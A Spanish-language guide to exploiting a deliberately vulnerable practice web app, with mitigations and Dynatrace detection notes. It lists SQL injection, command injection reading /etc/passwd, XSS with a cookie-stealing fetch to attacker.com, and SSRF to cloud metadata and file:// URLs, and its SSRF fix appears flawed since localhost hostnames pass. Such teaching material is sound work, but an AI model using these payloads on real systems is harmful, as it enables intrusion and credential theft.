# Guía de Explotación de Vulnerabilidades

**ADVERTENCIA:** Esta información se proporciona únicamente con fines educativos y de pruebas de seguridad. No utilices estos métodos en aplicaciones o sistemas sin autorización explícita.

Este documento detalla cómo explotar cada una de las vulnerabilidades implementadas en la aplicación web.

## 1. Inyección SQL

La aplicación contiene dos puntos vulnerables a inyección SQL:

### 1.1. Formulario de Login (`/login`)

**Vulnerabilidad:** La consulta SQL se construye directamente con las entradas del usuario sin parameterización.

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Explotación:**

1. **Bypassing de autenticación:**
   - Usuario: `admin' --`
   - Contraseña: `cualquier_cosa`
   
   Esta entrada modifica la consulta a: `SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'cualquier_cosa'`, comentando la parte de la contraseña.

2. **Login como cualquier usuario:**
   - Usuario: `' OR '1'='1' --`
   - Contraseña: `cualquier_cosa`
   
   Esta entrada modifica la consulta a: `SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'cualquier_cosa'`, que devuelve todos los usuarios y toma el primero.

3. **Extracción de información de la base de datos:**
   - Usuario: `admin' UNION SELECT 1, 'hacker', 'password', 'hack@example.com', 'admin' --`
   - Contraseña: `cualquier_cosa`
   
   Esta entrada usa UNION para inyectar un usuario falso en los resultados.

### 1.2. Búsqueda de Productos (`/search`)

**Vulnerabilidad:** La consulta SQL se construye directamente usando parámetros GET de la URL.

```python
query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
if category:
    query += f" AND category = '{category}'"
```

**Explotación:**

1. **Mostrar todos los productos:**
   - URL: `/search?keyword=' OR '1'='1`
   
   Esta entrada modifica la consulta a: `SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'`

2. **Extraer datos de la tabla de usuarios:**
   - URL: `/search?keyword=%' UNION SELECT id, username, password, email, role FROM users WHERE '1'='1`
   
   Esta entrada usa UNION para combinar los resultados con datos de la tabla de usuarios.

3. **Manipulación de categoría:**
   - URL: `/search?keyword=laptop&category=' OR '1'='1`
   
   Esta entrada modifica la consulta para ignorar el filtro de categoría.

## 2. Inyección de Comandos

La aplicación contiene dos puntos vulnerables a inyección de comandos:

### 2.1. Herramienta de Red (`/network_tool`)

**Vulnerabilidad:** El comando ping se ejecuta directamente con la entrada del usuario sin validación.

```python
command = f"ping -c 4 {host}"
result = subprocess.run(command, shell=True, capture_output=True, text=True)
```

**Explotación:**

1. **Ejecución de comandos adicionales:**
   - Entrada: `google.com; ls -la`
   
   Esta entrada ejecuta ping y luego lista todos los archivos del directorio actual.

2. **Ejecución condicional:**
   - Entrada: `google.com && cat /etc/passwd`
   
   Esta entrada ejecuta ping y, si tiene éxito, muestra el contenido del archivo passwd.

3. **Redirección de salida:**
   - Entrada: `google.com > /tmp/output.txt`
   
   Esta entrada redirige la salida del ping a un archivo.

### 2.2. Lector de Archivos (`/file_reader`)

**Vulnerabilidad:** El comando cat se ejecuta directamente con la entrada del usuario sin restricciones de ruta.

```python
command = f"cat {filename}"
result = subprocess.run(command, shell=True, capture_output=True, text=True)
```

**Explotación:**

1. **Acceso a archivos sensibles:**
   - Entrada: `/etc/passwd`
   
   Esta entrada muestra el contenido del archivo de contraseñas.

2. **Ejecución de comandos adicionales:**
   - Entrada: `/etc/hosts; id`
   
   Esta entrada muestra el archivo hosts y luego ejecuta el comando id.

3. **Acceso a archivos de configuración:**
   - Entrada: `app.py`
   
   Esta entrada muestra el código fuente de la aplicación.

## 3. Validación de Entrada Incorrecta

La aplicación contiene múltiples puntos con validación incorrecta:

### 3.1. Formulario de Registro (`/register`)

**Vulnerabilidad:** No hay validación adecuada para longitud, formato o contenido de los campos.

**Explotación:**

1. **Desbordamiento de entrada:**
   - Nombre de usuario: Un string extremadamente largo (>1000 caracteres)
   
   Esto puede causar problemas de almacenamiento o visualización.

2. **Inyección XSS:**
   - Nombre de usuario: `<script>alert('XSS')</script>`
   
   Esto puede insertar un script que se ejecute cuando se muestre el nombre de usuario.

3. **Formato de email no válido:**
   - Email: `not_an_email`
   
   Aunque el navegador tiene validación básica, esta puede ser evitada manipulando la petición HTTP directamente.

### 3.2. Comentarios de Productos (`/comment/add`)

**Vulnerabilidad:** No hay sanitización ni filtrado de HTML en los comentarios.

**Explotación:**

1. **XSS persistente:**
   - Comentario: `<script>alert(document.cookie)</script>`
   
   Este script se ejecutará cada vez que alguien vea la página del producto.

2. **Robo de cookies:**
   - Comentario: `<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
   
   Este código enviará las cookies a un servidor controlado por el atacante.

## 4. SSRF (Server-Side Request Forgery)

La aplicación contiene dos puntos vulnerables a SSRF:

### 4.1. Verificador de Sitios Web (`/check_website`)

**Vulnerabilidad:** La aplicación realiza solicitudes a URLs proporcionadas por el usuario sin validación.

```python
response = requests.get(url, timeout=5)
```

**Explotación:**

1. **Acceso a servicios internos:**
   - URL: `http://localhost:5000/dashboard`
   
   Esto hace que el servidor acceda a sí mismo y muestre partes privadas de la aplicación.

2. **Escaneo de puertos:**
   - URL: `http://localhost:22`
   
   Esto intenta conectarse al puerto SSH local para determinar si está abierto.

3. **Acceso a metadatos en entornos cloud:**
   - URL: `http://169.254.169.254/latest/meta-data/`
   
   En entornos AWS, esto podría revelar metadatos sensibles de la instancia.

### 4.2. API de Recursos (`/api/fetch_resource`)

**Vulnerabilidad:** La API acepta cualquier URL como parámetro y realiza solicitudes a ella.

**Explotación:**

1. **Acceso a archivos locales:**
   - URL: `/api/fetch_resource?url=file:///etc/passwd`
   
   Esto intenta leer archivos locales usando el esquema file://.

2. **Acceso a servicios internos en formato JSON:**
   - URL: `/api/fetch_resource?url=http://localhost:8080/admin`
   
   Esto permite acceder a servicios internos y obtener su respuesta en formato JSON.

## Detección con Dynatrace

Dynatrace puede detectar estas vulnerabilidades a través de:

1. **Análisis de código estático:** Identifica patrones vulnerables en el código.
2. **Análisis de runtime:** Detecta comportamientos sospechosos durante la ejecución.
3. **Monitoreo de seguridad:** Detecta intentos de explotación en tiempo real.

Para cada vulnerabilidad, Dynatrace mostrará:
- La ubicación exacta en el código
- La entrada que podría ser manipulada
- La severidad de la vulnerabilidad
- Recomendaciones para mitigarla

## Mitigación de Vulnerabilidades

Para fines educativos, aquí mostramos cómo se podrían mitigar estas vulnerabilidades:

### Inyección SQL
```python
# Vulnerable
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# Mitigado
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### Inyección de Comandos
```python
# Vulnerable
command = f"ping -c 4 {host}"
result = subprocess.run(command, shell=True, capture_output=True, text=True)

# Mitigado
import shlex
cmd = ["ping", "-c", "4", host]
result = subprocess.run(cmd, shell=False, capture_output=True, text=True)
```

### Validación de Entrada
```python
# Vulnerable
conn.execute('INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
             (username, password, email, 'user'))

# Mitigado
import re
if (len(username) > 50 or len(password) < 8 or 
    not re.match(r"[^@]+@[^@]+\.[^@]+", email)):
    raise ValueError("Datos de entrada no válidos")
```

### SSRF
```python
# Vulnerable
response = requests.get(url, timeout=5)

# Mitigado
import ipaddress
from urllib.parse import urlparse

def is_allowed_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        return False
    try:
        ip = ipaddress.ip_address(parsed.netloc)
        if ip.is_private or ip.is_loopback:
            return False
    except ValueError:
        pass  # No es una IP directa
    return True

if is_allowed_url(url):
    response = requests.get(url, timeout=5)
else:
    raise ValueError("URL no permitida")
```